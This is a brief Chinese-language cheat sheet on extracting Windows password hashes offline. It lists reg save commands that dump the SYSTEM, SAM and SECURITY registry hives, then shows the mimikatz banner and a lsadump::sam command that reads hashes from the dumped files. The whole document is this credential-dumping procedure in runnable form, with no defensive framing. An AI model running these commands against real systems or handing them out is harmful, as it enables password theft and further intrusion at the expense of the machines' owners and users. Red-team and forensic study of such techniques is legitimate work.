# Windows Hash提取

## 0x01 离线获取

### 1.注册表导出文件
```
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
reg save hklm\security security.hive
```
### 2. 通过mimikatz导出Hash

```
$ ./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::sam /sam:sam.hive /system:system.hive
```
